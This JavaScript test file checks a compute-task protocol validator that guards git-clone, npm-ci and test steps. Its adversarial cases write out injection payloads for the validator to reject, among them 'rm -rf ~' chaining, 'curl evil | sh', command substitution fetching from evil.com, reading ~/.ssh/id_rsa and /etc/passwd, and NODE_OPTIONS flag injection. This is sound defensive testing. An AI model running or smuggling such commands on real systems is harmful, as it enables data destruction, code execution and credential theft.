import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import {
  validateCapabilities, validateTask, validateResult,
  validateStep, validateSteps,
  ALLOWED_ACTIONS, ALLOWED_ORGS,
} from '../protocol.mjs';

describe('protocol', () => {
  const validCapabilities = {
    compute: { cpu: { model: 'Intel i7', cores: 6, threads: 12, arch: 'x86_64' }, ram_gb: 12, gpu: [] },
    storage: { total_gb: 120, free_gb: 55 },
    inference: { runtime: 'ollama', loaded_models: [] },
    runtime: { node: '22.11.0', sandbox: 'windows-sandbox' },
    offered: { task_types: ['compute.build-test'], max_concurrent: 1, cpu_percent: 80, ram_gb: 8 },
    limits: { thermal_ceiling_c: 85, disk_floor_gb: 60, max_task_duration_s: 1800 },
  };

  describe('validateCapabilities', () => {
    it('accepts valid capabilities', () => {
      const { valid, errors } = validateCapabilities(validCapabilities);
      assert.ok(valid, `unexpected errors: ${errors.join(', ')}`);
    });

    it('rejects missing compute section', () => {
      const { valid } = validateCapabilities({ storage: {}, offered: {}, limits: {} });
      assert.ok(!valid);
    });

    it('rejects unknown task types', () => {
      const cap = { ...validCapabilities, offered: { ...validCapabilities.offered, task_types: ['unknown.type'] } };
      const { valid, errors } = validateCapabilities(cap);
      assert.ok(!valid);
      assert.ok(errors.some((e) => e.includes('unknown task type')));
    });

    it('rejects zero cores', () => {
      const cap = JSON.parse(JSON.stringify(validCapabilities));
      cap.compute.cpu.cores = 0;
      const { valid } = validateCapabilities(cap);
      assert.ok(!valid);
    });

    it('rejects non-array GPU field', () => {
      const cap = JSON.parse(JSON.stringify(validCapabilities));
      cap.compute.gpu = 'nvidia';
      const { valid } = validateCapabilities(cap);
      assert.ok(!valid);
    });
  });

  describe('validateStep', () => {
    it('accepts a valid git-clone step', () => {
      const { valid } = validateStep({
        action: 'git-clone',
        repo: 'cohabitation-project/workspace',
        commit: 'a'.repeat(40),
      });
      assert.ok(valid);
    });

    it('accepts a valid npm-ci step', () => {
      const { valid } = validateStep({ action: 'npm-ci' });
      assert.ok(valid);
    });

    it('accepts a valid node-test step', () => {
      const { valid } = validateStep({ action: 'node-test', files: ['commons/test/unit.mjs'] });
      assert.ok(valid);
    });

    it('accepts a valid playwright-test step', () => {
      const { valid } = validateStep({ action: 'playwright-test', files: ['tests/e2e/smoke.spec.ts'] });
      assert.ok(valid);
    });

    it('rejects unknown actions', () => {
      const { valid, errors } = validateStep({ action: 'rm-rf' });
      assert.ok(!valid);
      assert.ok(errors.some(e => e.includes('unknown action')));
    });

    it('rejects null/non-object steps', () => {
      assert.ok(!validateStep(null).valid);
      assert.ok(!validateStep('string').valid);
    });

    // ---- git-clone specific ----

    it('rejects git-clone with a full URL instead of bare org/repo', () => {
      const { valid } = validateStep({
        action: 'git-clone',
        repo: 'https://github.com/cohabitation-project/workspace',
        commit: 'a'.repeat(40),
      });
      assert.ok(!valid);
    });

    it('rejects git-clone from non-allowlisted orgs', () => {
      const { valid, errors } = validateStep({
        action: 'git-clone',
        repo: 'evil-org/malware',
        commit: 'a'.repeat(40),
      });
      assert.ok(!valid);
      assert.ok(errors.some(e => e.includes('not in allowed list')));
    });

    it('rejects git-clone with a branch name instead of commit SHA', () => {
      const { valid } = validateStep({
        action: 'git-clone',
        repo: 'cohabitation-project/workspace',
        commit: 'main',
      });
      assert.ok(!valid);
    });

    it('rejects git-clone with a short SHA (not 40 chars)', () => {
      const { valid } = validateStep({
        action: 'git-clone',
        repo: 'cohabitation-project/workspace',
        commit: 'abc123',
      });
      assert.ok(!valid);
    });

    it('rejects git-clone with uppercase hex in commit', () => {
      const { valid } = validateStep({
        action: 'git-clone',
        repo: 'cohabitation-project/workspace',
        commit: 'A'.repeat(40),
      });
      assert.ok(!valid);
    });

    it('rejects git-clone with missing repo', () => {
      const { valid } = validateStep({ action: 'git-clone', commit: 'a'.repeat(40) });
      assert.ok(!valid);
    });

    // ---- Path validation for node-test and playwright-test ----

    it('rejects node-test with path traversal (..)', () => {
      const { valid, errors } = validateStep({ action: 'node-test', files: ['../../../etc/passwd'] });
      assert.ok(!valid);
      assert.ok(errors.some(e => e.includes('path traversal')));
    });

    it('rejects node-test with absolute paths', () => {
      const { valid, errors } = validateStep({ action: 'node-test', files: ['/tmp/evil.mjs'] });
      assert.ok(!valid);
      assert.ok(errors.some(e => e.includes('absolute paths')));
    });

    it('rejects node-test with empty files array', () => {
      const { valid } = validateStep({ action: 'node-test', files: [] });
      assert.ok(!valid);
    });

    it('rejects node-test with special characters in paths', () => {
      const { valid } = validateStep({ action: 'node-test', files: ['test; rm -rf /'] });
      assert.ok(!valid);
    });

    it('rejects node-test with shell metacharacters in paths', () => {
      const { valid } = validateStep({ action: 'node-test', files: ['test$(curl evil)'] });
      assert.ok(!valid);
    });

    it('rejects playwright-test with path traversal', () => {
      const { valid } = validateStep({ action: 'playwright-test', files: ['../../secrets.txt'] });
      assert.ok(!valid);
    });

    // ---- Setu review 2: leading-hyphen flag injection ----

    it('rejects node-test files starting with -r (flag injection)', () => {
      const { valid } = validateStep({ action: 'node-test', files: ['-r', 'x.js'] });
      assert.ok(!valid, 'leading hyphen "-r" must be rejected');
    });

    it('rejects node-test files with --inspect flag', () => {
      const { valid } = validateStep({ action: 'node-test', files: ['--inspect'] });
      assert.ok(!valid, '"--inspect" as file path must be rejected');
    });

    it('rejects node-test files with --watch flag', () => {
      const { valid } = validateStep({ action: 'node-test', files: ['--watch'] });
      assert.ok(!valid, '"--watch" as file path must be rejected');
    });

    it('rejects playwright-test files with --ui flag', () => {
      const { valid } = validateStep({ action: 'playwright-test', files: ['--ui'] });
      assert.ok(!valid, '"--ui" as file path must be rejected');
    });

    // ---- Setu review 2: extra/unknown fields ----

    it('rejects npm-ci with extra args and script fields', () => {
      const { valid, errors } = validateStep({ action: 'npm-ci', args: ['--foreground-scripts'], script: 'curl x | sh' });
      assert.ok(!valid, 'extra fields on npm-ci must be rejected');
      assert.ok(errors.some(e => e.includes('unknown field')));
    });

    it('rejects node-test with extra env field', () => {
      const { valid, errors } = validateStep({ action: 'node-test', files: ['ok.mjs'], env: { NODE_OPTIONS: '--require /tmp/x' } });
      assert.ok(!valid, 'extra env field must be rejected');
      assert.ok(errors.some(e => e.includes('unknown field')));
    });

    // ---- Setu review 2: dangerous repo names ----

    it('rejects git-clone with ".." repo name', () => {
      const { valid } = validateStep({
        action: 'git-clone',
        repo: 'cohabitation-project/..',
        commit: 'a'.repeat(40),
      });
      assert.ok(!valid, 'repo name ".." must be rejected');
    });

    it('rejects git-clone with "-x" repo name', () => {
      const { valid } = validateStep({
        action: 'git-clone',
        repo: 'cohabitation-project/-x',
        commit: 'a'.repeat(40),
      });
      assert.ok(!valid, 'repo name starting with "-" must be rejected');
    });
  });

  describe('validateSteps', () => {
    it('accepts a valid steps array', () => {
      const { valid } = validateSteps([
        { action: 'git-clone', repo: 'cohabitation-project/workspace', commit: 'a'.repeat(40) },
        { action: 'npm-ci' },
        { action: 'node-test', files: ['commons/test/unit.mjs'] },
      ]);
      assert.ok(valid);
    });

    it('rejects empty steps array', () => {
      const { valid } = validateSteps([]);
      assert.ok(!valid);
    });

    it('rejects non-array steps', () => {
      const { valid } = validateSteps('not an array');
      assert.ok(!valid);
    });

    it('rejects if any step is invalid', () => {
      const { valid, errors } = validateSteps([
        { action: 'npm-ci' },
        { action: 'rm-rf' },
      ]);
      assert.ok(!valid);
      assert.ok(errors.some(e => e.includes('unknown action')));
    });
  });

  // ---- Adversarial tests for every bypass Setu demonstrated ----

  describe('adversarial: shell chaining and injection', () => {
    it('rejects shell chaining with semicolons (bypass 1: git clone ; rm -rf)', () => {
      // The old regex allowed: git clone https://github.com/cohabitation-project/workspace ; rm -rf ~
      // New system: no shell strings at all. git-clone takes structured fields.
      const { valid } = validateStep({
        action: 'git-clone',
        repo: 'cohabitation-project/workspace ; rm -rf ~',
        commit: 'a'.repeat(40),
      });
      assert.ok(!valid, 'shell chaining via repo name must be rejected');
    });

    it('rejects shell chaining with semicolons in test files (bypass 2: node --test x; curl evil)', () => {
      const { valid } = validateStep({
        action: 'node-test',
        files: ['x.mjs; curl evil | sh'],
      });
      assert.ok(!valid, 'shell chaining via file path must be rejected');
    });

    it('rejects flag injection in test files (bypass 3: --require /tmp/anything.js)', () => {
      const { valid } = validateStep({
        action: 'node-test',
        files: ['--require /tmp/anything.js t'],
      });
      assert.ok(!valid, 'flag injection via file path must be rejected');
    });

    it('rejects command chaining with && in test files (bypass 4: a && cat ~/.ssh/id_rsa)', () => {
      const { valid } = validateStep({
        action: 'playwright-test',
        files: ['a && cat ~/.ssh/id_rsa'],
      });
      assert.ok(!valid, 'command chaining via file path must be rejected');
    });

    it('rejects command substitution in file paths', () => {
      const { valid } = validateStep({
        action: 'node-test',
        files: ['$(curl evil.com/payload)'],
      });
      assert.ok(!valid, 'command substitution must be rejected');
    });

    it('rejects backtick command substitution in file paths', () => {
      const { valid } = validateStep({
        action: 'node-test',
        files: ['`curl evil.com`'],
      });
      assert.ok(!valid, 'backtick substitution must be rejected');
    });

    it('rejects pipe characters in file paths', () => {
      const { valid } = validateStep({
        action: 'node-test',
        files: ['test.mjs | cat /etc/passwd'],
      });
      assert.ok(!valid, 'pipe characters must be rejected');
    });

    it('rejects newlines in file paths', () => {
      const { valid } = validateStep({
        action: 'node-test',
        files: ['test.mjs\ncurl evil.com'],
      });
      assert.ok(!valid, 'newlines must be rejected');
    });

    it('cannot inject URLs into git-clone repo field', () => {
      const { valid } = validateStep({
        action: 'git-clone',
        repo: 'https://evil.com/repo',
        commit: 'a'.repeat(40),
      });
      assert.ok(!valid, 'URLs must be rejected in repo field');
    });

    it('cannot bypass org check with path traversal in repo', () => {
      const { valid } = validateStep({
        action: 'git-clone',
        repo: 'cohabitation-project/../evil-org/repo',
        commit: 'a'.repeat(40),
      });
      assert.ok(!valid, 'path traversal in repo must be rejected');
    });
  });

  describe('validateTask', () => {
    const validTask = {
      type: 'compute.build-test',
      requirements: { cpu_cores_min: 2, ram_gb_min: 4 },
      payload: {
        sandbox: 'required',
        steps: [
          { action: 'git-clone', repo: 'cohabitation-project/workspace', commit: 'a'.repeat(40) },
          { action: 'npm-ci' },
          { action: 'node-test', files: ['commons/test/unit.mjs'] },
        ],
      },
      constraints: { timeout_s: 600 },
    };

    it('accepts a valid compute task with structured steps', () => {
      const { valid, errors } = validateTask(validTask);
      assert.ok(valid, `unexpected errors: ${errors?.join(', ')}`);
    });

    it('rejects missing type', () => {
      const { valid } = validateTask({ ...validTask, type: undefined });
      assert.ok(!valid);
    });

    it('rejects compute task without steps', () => {
      const { valid, errors } = validateTask({
        ...validTask,
        payload: { sandbox: 'required' },
      });
      assert.ok(!valid);
      assert.ok(errors.some(e => e.includes('steps')));
    });

    it('rejects compute task without sandbox: required', () => {
      const { valid, errors } = validateTask({
        ...validTask,
        payload: { steps: validTask.payload.steps },
      });
      assert.ok(!valid);
      assert.ok(errors.some(e => e.includes('sandbox')));
    });

    it('rejects compute task with old-format commands array', () => {
      const { valid } = validateTask({
        ...validTask,
        payload: {
          sandbox: 'required',
          commands: ['npm ci --ignore-scripts'],
        },
      });
      assert.ok(!valid, 'old commands format must be rejected');
    });

    it('rejects inference task without prompt', () => {
      const task = { type: 'inference.completion', requirements: {}, payload: { model: 'test' }, constraints: { timeout_s: 60 } };
      const { valid } = validateTask(task);
      assert.ok(!valid);
    });

    it('accepts inference task with prompt', () => {
      const task = { type: 'inference.completion', requirements: {}, payload: { prompt: 'hello' }, constraints: { timeout_s: 60 } };
      const { valid } = validateTask(task);
      assert.ok(valid);
    });
  });

  describe('validateResult', () => {
    it('accepts a valid result', () => {
      const { valid } = validateResult({
        task_id: 't_123', node_id: 'n_456', status: 'completed',
        output: { exit_code: 0 }, resources_used: { peak_ram_gb: 1 },
      });
      assert.ok(valid);
    });

    it('rejects missing task_id', () => {
      const { valid } = validateResult({ node_id: 'n_456', status: 'completed', output: {}, resources_used: {} });
      assert.ok(!valid);
    });

    it('rejects invalid status', () => {
      const { valid } = validateResult({ task_id: 't_1', node_id: 'n_1', status: 'running', output: {}, resources_used: {} });
      assert.ok(!valid);
    });
  });
});
